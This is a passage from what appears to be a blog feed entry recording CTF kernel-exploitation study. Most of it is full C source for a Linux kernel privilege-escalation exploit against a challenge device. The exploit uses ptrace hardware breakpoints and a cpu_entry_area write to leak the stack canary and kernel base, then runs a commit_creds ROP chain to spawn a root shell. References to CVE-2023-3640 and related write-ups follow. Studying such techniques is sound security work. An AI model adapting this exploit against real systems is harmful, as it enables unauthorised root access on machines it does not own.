class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810eeec0</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82e8abe0</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff81e010b0</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], rop_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> canary;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> leak;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810eeec0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82e8abe0</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81e010b0</span>;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff810aaa80</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> value)</span><br>&#123;<br>    ioctl(dev_fd , <span class="hljs-number">0x7204</span> , value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(<span class="hljs-number">0x10</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br>    <br>    <span class="hljs-type">int</span> step = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        <span class="hljs-keyword">switch</span> (step)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            uname(uts);<br>            <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>            &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>                write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>                step++;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Wait for ROP chain&quot;</span>);<br>            <span class="hljs-keyword">if</span> (read(rop_pipe[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE) &lt; <span class="hljs-number">0</span>)<br>                err_exit(<span class="hljs-string">&quot;read ROP chain&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Get ROP chain successfully&quot;</span>);<br>            step++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Try to write ROP chain&quot;</span>);<br>            <span class="hljs-comment">// path 2</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">mm_map</span>;</span><br>            mm_map.start_code  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_code    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_data  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_data    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_brk   = <span class="hljs-number">0x2000000</span>;<br>            mm_map.brk         = <span class="hljs-number">0x2000000</span>;<br>            mm_map.start_stack = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.auxv        = MMAP_ADDR;<br>            mm_map.auxv_size   = <span class="hljs-number">0x140</span>;<br>            mm_map.exe_fd      = <span class="hljs-number">-2</span>;<br>            prctl(PR_SET_MM, PR_SET_MM_MAP, &amp;mm_map, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map), <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x7201</span>, CPU_ENTRY_AREA_DB_STACK_RCX_ADDR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        ioctl(dev_fd, <span class="hljs-number">0x7202</span>, <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++)<br>    &#123;<br>        ioctl(dev_fd, <span class="hljs-number">0x7202</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">0</span>);<br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">1</span>);<br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">2</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/seven&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br><br>    init();<br><br>    mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><br>    pipe(pipe_fd);<br>    pipe(rop_pipe);<br><br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;canary, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] canary is 0x%lx\n&quot;</span>, canary);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    kernel_offset = leak - <span class="hljs-number">0xffffffff810d7182</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    pop_rdi += kernel_offset;<br>    init_cred += kernel_offset;<br>    commit_creds += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br><br>    <span class="hljs-built_in">memset</span>(MMAP_ADDR, <span class="hljs-number">0</span> , MMAP_SIZE);<br>    <span class="hljs-type">size_t</span> *rop_chain = MMAP_ADDR;<br>    <span class="hljs-type">int</span> canary_idx = <span class="hljs-number">0x30</span>;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0x37</span>;<br><br>    rop_chain[canary_idx] = canary;<br>    rop_chain[idx++] = pop_rdi;<br>    rop_chain[idx++] = init_cred;<br>    rop_chain[idx++] = commit_creds;<br>    rop_chain[idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">54</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[idx++] = user_cs;<br>    rop_chain[idx++] = user_rflags;<br>    rop_chain[idx++] = user_sp;<br>    rop_chain[idx++] = user_ss;<br><br><br>    write(rop_pipe[<span class="hljs-number">1</span>], rop_chain, MMAP_SIZE);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <br><br>    <span class="hljs-comment">// 0xffffc90000247c00</span><br>    <span class="hljs-comment">// canary :0xffffc90000247db8</span><br>    <span class="hljs-comment">// ret_addr = 0xffffc90000247db8</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://github.com/pray77/CVE-2023-3640/blob/main/README.md">CVE-2023-3640&#x2F;README.md at main Â· pray77&#x2F;CVE-2023-3640 (github.com)</a></p><p><a href="https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">ä¸€ç§å€ŸåŠ©ç¡¬ä»¶æ–­ç‚¹çš„ææƒæ€è·¯åˆ†æä¸æ¼”ç¤º (veritas501.github.io)</a></p><p><a href="https://github.com/veritas501/hbp_attack_demo">veritas501&#x2F;hbp_attack_demo: linux kernel LPE using hw_breakpoint attack tech demo (github.com)</a></p><p><a href="https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html">https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ã€ç¥­ã€‘æ— ä¸ºçš„ä¸€å¹´</title>
    <link href="/2023/12/30/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/30/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
